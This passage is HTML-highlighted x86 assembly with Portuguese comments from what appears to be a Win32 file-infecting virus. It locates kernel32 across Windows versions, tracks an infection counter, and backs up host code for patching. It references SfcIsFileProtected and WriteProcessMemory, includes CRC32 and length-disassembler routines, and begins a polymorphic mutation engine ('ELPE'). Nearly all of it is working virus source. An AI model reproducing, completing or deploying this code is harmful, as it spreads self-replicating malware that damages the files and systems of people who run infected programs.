</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">pula_tabela</span><span class="sc0">         </span><span class="sc1">; Salta tabela...</span><span class="sc0">

</span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">077E5h</span><span class="sc0">                </span><span class="sc1">; WinXP (PROfessional)  \  NT 5.1 (BSD based ?)</span><span class="sc0">
</span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">077E6h</span><span class="sc0">                </span><span class="sc1">; WinXP (Home Edition)  /</span><span class="sc0">

</span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">077F0h</span><span class="sc0">                </span><span class="sc1">; WinNT/2K \
dw 077EDh                ; WinNT/2K  \  NT 4 based</span><span class="sc0">
</span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">077E8h</span><span class="sc0">                </span><span class="sc1">; WinNT/2K  /</span><span class="sc0">
</span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">077E0h</span><span class="sc0">                </span><span class="sc1">; WinNT/2K /</span><span class="sc0">

</span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0BFF6h</span><span class="sc0">                </span><span class="sc1">; WinME      \  MS-DOS based ? lol ! :P</span><span class="sc0">
</span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0BFF7h</span><span class="sc0">                </span><span class="sc1">; Win95/98   /</span><span class="sc0">

</span><span class="sc5">pula_tabela</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">                  </span><span class="sc1">; ESI = Ponteiro para a tabela</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                  </span><span class="sc1">; ECX = 8</span><span class="sc0">

</span><span class="sc5">le_checa</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">              </span><span class="sc1">; EAX = 0</span><span class="sc0">
</span><span class="sc6">lodsw</span><span class="sc0">                    </span><span class="sc1">; Carrega [ESI] em EAX</span><span class="sc0">
</span><span class="sc6">rol</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">10h</span><span class="sc0">              </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">              </span><span class="sc1">; EBX = EAX</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">ChecaKrn</span><span class="sc0">            </span><span class="sc1">; Checa se a kernel está neste endereço...</span><span class="sc0">
</span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">               </span><span class="sc1">; EAX = 0 ?</span><span class="sc0">
</span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">achou_krn</span><span class="sc0">             </span><span class="sc1">; Então achamos, vaza !</span><span class="sc0">
</span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">le_checa</span><span class="sc0">            </span><span class="sc1">; Senão checa denovo...</span><span class="sc0">

</span><span class="sc5">achou_krn</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">                      </span><span class="sc1">; Retorna...</span><span class="sc0">

</span><span class="sc5">ProcuraKrn</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc1">; -----------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;            Checa se a kenel está no endereço dado</span><span class="sc0">
</span><span class="sc1">; -----------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">; Entrada: EAX = Endereço</span><span class="sc0">
</span><span class="sc1">; Saida: EAX=0 (ok) / EAX&lt;&gt;0 (erro)</span><span class="sc0">

</span><span class="sc5">ChecaKrn</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">

</span><span class="sc6">pushad</span><span class="sc0">                       </span><span class="sc1">; Salva regs.</span><span class="sc0">

</span><span class="sc5">pseh</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">handler2</span><span class="sc4">&gt;</span><span class="sc0">          </span><span class="sc1">; Instala SEH</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc5">wod</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc3">"ZM"</span><span class="sc0">           </span><span class="sc1">; Tem assinatura MZ ?</span><span class="sc0">
</span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">handler2</span><span class="sc0">                 </span><span class="sc1">; Senão vaza..</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">3Ch</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc5">wod</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">],</span><span class="sc3">"EP"</span><span class="sc0">           </span><span class="sc1">; Tem assinatura PE ?</span><span class="sc0">
</span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">handler2</span><span class="sc0">                 </span><span class="sc1">; Senão vaza..</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">ebx.NT_OptionalHeader.OH_DirectoryEntries.DE_Export.DD_VirtualAddress</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc5">eax.ED_Name</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">],</span><span class="sc3">"NREK"</span><span class="sc0">             </span><span class="sc1">; É a kernel ?</span><span class="sc0">
</span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">handler2</span><span class="sc0">                 </span><span class="sc1">; Senão vaza...</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">+</span><span class="sc5">STACK_REG</span><span class="sc4">+</span><span class="sc5">_EAX</span><span class="sc4">],</span><span class="sc8">edx</span><span class="sc0"> </span><span class="sc1">; EAX na stack = 0</span><span class="sc0">

</span><span class="sc5">handler2</span><span class="sc4">:</span><span class="sc0">                    </span><span class="sc1">; Exception Handler</span><span class="sc0">
</span><span class="sc5">rseh</span><span class="sc0">                         </span><span class="sc1">; Remove SEH</span><span class="sc0">
</span><span class="sc6">popad</span><span class="sc0">                        </span><span class="sc1">; Recupera regs.</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">                          </span><span class="sc1">; Retorna...</span><span class="sc0">

</span><span class="sc5">ChecaKrn</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc1">; -----------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;                     Pega Delta-Offset</span><span class="sc0">
</span><span class="sc1">; -----------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">infec_max</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">      </span><span class="sc1">; Maximo de infecções (1ª geração = FFh, outras = 6)</span><span class="sc0">
</span><span class="sc5">kernel</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">            </span><span class="sc1">; Kernel base</span><span class="sc0">
</span><span class="sc5">baseaddr</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00400000h</span><span class="sc0">  </span><span class="sc1">; Endereço base para o executavel original</span><span class="sc0">
</span><span class="sc5">busca</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">             </span><span class="sc1">; Ponteiro para Win32_Find_Data na memoria</span><span class="sc0">
</span><span class="sc5">SH</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">                </span><span class="sc1">; SearchHandle</span><span class="sc0">
</span><span class="sc5">FH</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">                </span><span class="sc1">; FileHandle</span><span class="sc0">
</span><span class="sc5">Mem</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">               </span><span class="sc1">; Ponteiro para mapa do arquivo na memoria</span><span class="sc0">
</span><span class="sc5">sfc_func</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">          </span><span class="sc1">; Ponteiro para SfcIsFileProtected</span><span class="sc0">
</span><span class="sc5">sfc_dll</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">; Ponteiro para a DLL</span><span class="sc0">
</span><span class="sc5">rndseed</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">; Random seed</span><span class="sc0">
</span><span class="sc5">host_org</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">  </span><span class="sc1">; Backup do código original do hospedeiro</span><span class="sc0">

</span><span class="sc5">Delta_Offset</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">

</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">delta</span><span class="sc0">             </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">delta</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">delta_fim</span><span class="sc0">          </span><span class="sc1">; Salta para o fim da rotina...</span><span class="sc0">

</span><span class="sc5">api_addrs</span><span class="sc0"> </span><span class="sc9">label</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0">   </span><span class="sc1">; Array de armazenamento de entrypoint de APIs</span><span class="sc0">
</span><span class="sc5">CloseHandle</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">CreateFileA</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">CreateMutexA</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">FindClose</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">FindFirstFileA</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">FindNextFileA</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">FreeLibrary</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">GetCurrentDirectoryA</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">GetCurrentProcess</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">GetDriveTypeA</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">GetFileAttributesA</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">GetModuleHandleA</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">GetProcAddress</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">GetSystemDirectoryA</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">GetSystemTime</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">GetVersionExA</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">GetWindowsDirectoryA</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">LoadLibraryA</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">ReadFile</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">SetCurrentDirectoryA</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">SetFileAttributesA</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">SetFilePointer</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">VirtualAlloc</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">VirtualFree</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">VirtualProtect</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">WriteFile</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">WriteProcessMemory</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">

</span><span class="sc5">delta_fim</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">Delta_Offset</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc1">; -----------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;       Calcula CRC32, ajustado do código de Billy Belcebu</span><span class="sc0">
</span><span class="sc1">; -----------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">; Entrada:</span><span class="sc0">
</span><span class="sc1">; Arg1 = Ponteiro para string</span><span class="sc0">
</span><span class="sc1">; Arg2 = Tamanho da string</span><span class="sc0">
</span><span class="sc1">; Saida:</span><span class="sc0">
</span><span class="sc1">; EAX = CRC32 da String</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; OBS: Eu sei, esta rotina é incrivelmente lenta e grande, mas não</span><span class="sc0">
</span><span class="sc1">; quis mudar nada dela, pois seria muito trabalho em cima de um código</span><span class="sc0">
</span><span class="sc1">; que admito não compreender completamente.</span><span class="sc0">

</span><span class="sc5">CRC32</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">

</span><span class="sc6">pushad</span><span class="sc0">          </span><span class="sc1">; Salva regs.</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc5">STACK_REGS</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; ESI = Ponteiro para string</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc5">STACK_REGS</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; EDI = Tamanho da string</span><span class="sc0">

</span><span class="sc6">cld</span><span class="sc0">             </span><span class="sc1">; D=0 (mostra que ESI deve avançar)</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">     </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">         </span><span class="sc1">; ECX = -1</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">     </span><span class="sc1">; EDX = -1</span><span class="sc0">

</span><span class="sc5">NextByteCRC</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">     </span><span class="sc1">; EAX = 0</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">     </span><span class="sc1">; EBX = 0</span><span class="sc0">
</span><span class="sc6">lodsb</span><span class="sc0">           </span><span class="sc1">; Carrega ESI em AL</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">       </span><span class="sc1">; XOR AL,CL</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc8">ch</span><span class="sc0">       </span><span class="sc1">; CL = CH</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc8">dl</span><span class="sc0">       </span><span class="sc1">; CH = DL</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc8">dh</span><span class="sc0">       </span><span class="sc1">; DL = DH</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">        </span><span class="sc1">; DH = 8 (8 bits de AL)</span><span class="sc0">

</span><span class="sc5">NextBitCRC</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">        </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">rcr</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">        </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">jnc</span><span class="sc0"> </span><span class="sc5">NoCRC</span><span class="sc0">       </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">08320h</span><span class="sc0">   </span><span class="sc1">; XOR AX, MAGIC_1</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">0EDB8h</span><span class="sc0">   </span><span class="sc1">; XOR BX, MAGIC_2</span><span class="sc0">

</span><span class="sc5">NoCRC</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">dh</span><span class="sc0">          </span><span class="sc1">; DH--</span><span class="sc0">
</span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">NextBitCRC</span><span class="sc0">  </span><span class="sc1">; Tem mais bits ? Então continua...</span><span class="sc0">

</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">     </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">     </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">         </span><span class="sc1">; EDI--</span><span class="sc0">
</span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">NextByteCRC</span><span class="sc0"> </span><span class="sc1">; Tem mais bytes ? Então continua...</span><span class="sc0">

</span><span class="sc6">not</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">         </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">not</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">         </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">     </span><span class="sc1">; EAX = EDX</span><span class="sc0">
</span><span class="sc6">rol</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">10h</span><span class="sc0">     </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">       </span><span class="sc1">; AX = CX</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esp.STACK_REG._EAX</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">   </span><span class="sc1">; Muda o EAX na stack..</span><span class="sc0">
</span><span class="sc6">popad</span><span class="sc0">           </span><span class="sc1">; Recupera regs..</span><span class="sc0">

</span><span class="sc6">ret</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">            </span><span class="sc1">; Retorna...</span><span class="sc0">

</span><span class="sc5">CRC32</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc1">; -----------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;     RGBLDE by roy g biv (original code / código original)</span><span class="sc0">
</span><span class="sc1">; -----------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">; Entrada:</span><span class="sc0">
</span><span class="sc1">; ESI = Ponteiro para o código</span><span class="sc0">
</span><span class="sc1">; Saida:</span><span class="sc0">
</span><span class="sc1">; EAX = Tamanho do código</span><span class="sc0">

</span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">RGBLDE.inc</span><span class="sc0">

</span><span class="sc1">; -----------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">; =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=</span><span class="sc0">
</span><span class="sc1">; -+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;               ELPE - Éris Low Polymorphic Engine</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;                          by cH4R_</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; -----------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">; -+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-</span><span class="sc0">
</span><span class="sc1">; =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=</span><span class="sc0">

</span><span class="sc1">; ---- Cria base para geração de codigo polimorfico ----</span><span class="sc0">

</span><span class="sc5">Cria_Genotipo</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">
</span><span class="sc1">; Saida:</span><span class="sc0">
</span><span class="sc1">; EBX = Genótipo</span><span class="sc0">

</span><span class="sc1">; Coleta números randomicos e gera um genótipo</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">     </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">rand</span><span class="sc0">     </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">   </span><span class="sc1">;  G0 a G4</span><span class="sc0">
</span><span class="sc6">rol</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">     </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">      </span><span class="sc1">;</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">     </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">rand</span><span class="sc0">     </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">rcr</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">     </span><span class="sc1">;  G5</span><span class="sc0">
</span><span class="sc6">jnc</span><span class="sc0"> </span><span class="sc5">sem_g5</span><span class="sc0">    </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">      </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">sem_g5</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">rol</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc2">7</span><span class="sc0">      </span><span class="sc1">;</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0">          </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">rand</span><span class="sc0">       </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">7</span><span class="sc0">          </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">         </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">rcl</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">18h</span><span class="sc0">     </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">copia_bits</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">rcl</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">       </span><span class="sc1">;  G6 e G7</span><span class="sc0">
</span><span class="sc6">jnc</span><span class="sc0"> </span><span class="sc5">sem_gen</span><span class="sc0">     </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">        </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">sem_gen</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">ror</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">        </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">copia_bits</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">rol</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">       </span><span class="sc1">;</span><span class="sc0">

</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">       </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc2">15</span><span class="sc0">     </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">rcr</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">     </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">adc</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">      </span><span class="sc1">;  G8</span><span class="sc0">
</span><span class="sc6">rcr</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">     </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">adc</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">      </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">sem_bit</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">rol</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">     </span><span class="sc1">;</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">     </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">rand</span><span class="sc0">     </span><span class="sc1">;  G9</span><span class="sc0">
